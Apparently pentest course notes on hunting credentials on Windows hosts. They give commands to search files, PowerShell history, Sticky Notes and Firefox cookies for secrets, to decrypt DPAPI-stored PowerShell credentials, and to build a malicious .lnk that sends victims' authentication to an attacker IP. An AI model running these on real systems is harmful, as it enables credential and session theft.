# Windows Credential Hunting

### Application Configuration Files

```powershell-session
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

### Dictionary Files

**Chrome Dictionary Files**

```powershell-session
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

### Unattended Installation Files

* Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation.
* Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.

```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

* Although these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file.

### PowerShell History File

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Confirming PowerShell History Save Path**

```powershell-session
(Get-PSReadLineOption).HistorySavePath
```

**Reading PowerShell History File**

```powershell-session
gc (Get-PSReadLineOption).HistorySavePath
```

```powershell-session
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

* We can also use this one-liner to retrieve the contents of all Powershell history files that we can access as our current user.

### PowerShell Credentials

* PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently.
* The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data\_Protection\_API), which typically means they can only be decrypted by the same user on the same computer they were created on.
* Take, for example, the following script `Connect-VC.ps1`, which a sysadmin has created to connect to a vCenter server easily.

```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

**Decrypting PowerShell Credentials**

* If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `encrypted.xml`.
  * The example below assumes the former.

```powershell-session
 $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
```

```powershell-session
$credential.GetNetworkCredential().username
```

```powershell-session
$credential.GetNetworkCredential().password
```

### Manually Searching the File System for Credentials

```cmd-session
findstr /spin "password" *.*
```

**Search File Contents with PowerShell**

```powershell-session
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```

**Search for File Extensions - Example 1**

```cmd-session
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

**Search for File Extensions - Example 2**

```cmd-session
where /R C:\ *.config
```

**Search for File Extensions Using PowerShell**

```powershell-session
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

### Sticky Notes Passwords

* located here

```
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

* We can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query `select Text from Note;`.

**Viewing Sticky Notes Data Using PowerShell**

```powershell-session
Set-ExecutionPolicy Bypass -Scope Process
```

```powershell-session
Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```

```powershell-session
cd .\PSSQLite\
```

```powershell-session
Import-Module .\PSSQLite.psd1
```

```powershell-session
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
```

```powershell-session
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

**Strings to View DB File Contents**

* We can also copy them over to our attack box and search through the data using the `strings` command, which may be less efficient depending on the size of the database.

### Other Files of Interest

**Other Interesting Files**

* Some other files we may find credentials in include the following:
*

```shell-session
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log

#### Copy Firefox Cookies Database

```powershell-session
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

* We can copy the file to our machine and use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.

```shell-session
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

### Email

* If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox,
  * we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).

### When all else fails

* &#x20;run the [laZagne](app://obsidian.md/laZagne) tool in an attempt to retrieve credentials from a wide variety of software

```

### Capturing Hashes with a Malicious .lnk File

* Using SCFs no longer works on Server 2019 hosts,
  * but we can achieve the same effect using a malicious [.lnk](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943) file.
* We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file.
  * We can also make one using a few lines of PowerShell:

**Generating a Malicious .lnk File**

```powershell-session
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
